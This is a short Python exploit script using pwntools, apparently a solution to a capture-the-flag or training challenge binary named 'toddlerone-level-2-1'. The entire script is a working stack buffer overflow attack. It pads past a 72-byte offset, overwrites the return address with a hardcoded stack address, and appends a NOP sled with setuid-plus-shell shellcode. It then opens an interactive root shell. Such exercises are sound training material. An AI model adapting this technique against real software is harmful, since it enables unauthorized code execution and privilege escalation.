from pwn import *


offset = 72
rbp = 0x7fffffffd670
addr_shellcode = p64(rbp+16)
proc = process('/challenge/toddlerone-level-2-1')
context.arch = 'amd64'
shellcode = asm(shellcraft.setuid()) + asm(shellcraft.sh())

size = offset + 8 + 20 + len(shellcode)
proc.sendline(str(size).encode())
proc.recv()

payload = b'A' * offset + addr_shellcode + b'\x90'*20 + shellcode
proc.sendline(payload)

proc.interactive()
